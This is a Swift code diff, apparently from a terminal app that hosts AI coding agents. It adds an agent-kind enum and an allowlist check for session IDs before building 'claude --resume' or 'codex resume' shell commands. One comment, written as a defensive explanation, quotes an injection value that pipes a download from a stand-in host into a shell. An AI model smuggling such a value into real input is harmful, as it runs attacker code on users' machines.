@@ -6,6 +6,49 @@ enum PaneStatus: String, Codable, Equatable {
     case waitingForInput
 }
 
+/// Which agent CLI a pane's lifecycle events came from. Carried on the
+/// `nex event --agent <name>` wire field (absent = `.claude`, the
+/// pre-#101 behaviour) and persisted on the pane so a restart can
+/// compose the right resume command. Strict enum — never interpolate a
+/// raw wire string into a shell command.
+enum AgentKind: String, Codable, Equatable {
+    case claude
+    case codex
+
+    /// Shell command that resumes session `sessionID` for this agent,
+    /// typed into a freshly spawned PTY on restart / reopen-closed-pane.
+    /// Returns nil — resume is skipped — when the session id fails the
+    /// allowlist: the id arrives on the wire (hook stdin → socket JSON)
+    /// and is later *typed into a shell*, so a hostile local sender
+    /// could otherwise persist `x; curl evil | sh` for execution on the
+    /// next restart. Known Claude/Codex ids are UUID-shaped; the
+    /// allowlist is a conservative superset (review of #101).
+    func resumeCommand(sessionID: String) -> String? {
+        guard Self.isSafeSessionID(sessionID) else { return nil }
+        return switch self {
+        case .claude: "claude --resume \(sessionID)"
+        case .codex: "codex resume \(sessionID)"
+        }
+    }
+
+    /// Shell-inert session-id shape: alphanumerics plus `.`/`_`/`-`,
+    /// non-empty, bounded length. Anything else never reaches a PTY.
+    static func isSafeSessionID(_ id: String) -> Bool {
+        guard !id.isEmpty, id.count <= 128 else { return false }
+        return id.allSatisfy { ch in
+            ch.isASCII && (ch.isLetter || ch.isNumber || ch == "." || ch == "_" || ch == "-")
+        }
+    }
+
+    /// Wire-string mapping: absent or unrecognized values fall back to
+    /// `.claude` so an old CLI (no `agent` field) keeps today's
+    /// behaviour. Case-insensitive — a hand-wired `--agent Codex`
+    /// should not silently mislabel the pane.
+    static func fromWire(_ raw: String?) -> AgentKind {
+        raw.flatMap { AgentKind(rawValue: $0.lowercased()) } ?? .claude
+    }
+}
+
 struct Pane: Identifiable, Equatable {
     /// Default body font size (px) for markdown preview panes. The reset
     /// keybinding (⌘0) snaps `markdownFontSize` back to this value.
@@ -29,6 +72,14 @@ struct Pane: Identifiable, Equatable {
     /// but never written to a file on disk.
     var scratchpadContent: String?
     var agentSessionID: String?
+    /// Last known agent CLI seen in this pane (set by `start` /
+    /// `session-start` lifecycle events, dual-fires included). Drives the
+    /// running-badge label and the restart resume command. Persisted;
+    /// deliberately NOT cleared alongside `agentSessionID` on state load —
+    /// it is a display/last-known value, and clearing it before the
+    /// resumable panes are captured would break codex resume. Nil = no
+    /// agent event ever seen (badge falls back to "claude").
+    var agentKind: AgentKind?
     /// Rendered body font size (px) for markdown preview panes. Per-pane,
     /// in-memory only; adjusted via Cmd+= / Cmd+-.
     var markdownFontSize: Double
@@ -71,6 +122,7 @@ struct Pane: Identifiable, Equatable {
         scratchpadContent: String? = nil,
         status: PaneStatus = .idle,
         agentSessionID: String? = nil,
+        agentKind: AgentKind? = nil,
         markdownFontSize: Double = Pane.defaultMarkdownFontSize,
         parkedSourcePaneID: UUID? = nil,
         agentStartedAt: Date? = nil,
@@ -90,6 +142,7 @@ struct Pane: Identifiable, Equatable {
         self.scratchpadContent = scratchpadContent
         self.status = status
         self.agentSessionID = agentSessionID
+        self.agentKind = agentKind
         self.markdownFontSize = markdownFontSize
         self.parkedSourcePaneID = parkedSourcePaneID
         self.agentStartedAt = agentStartedAt
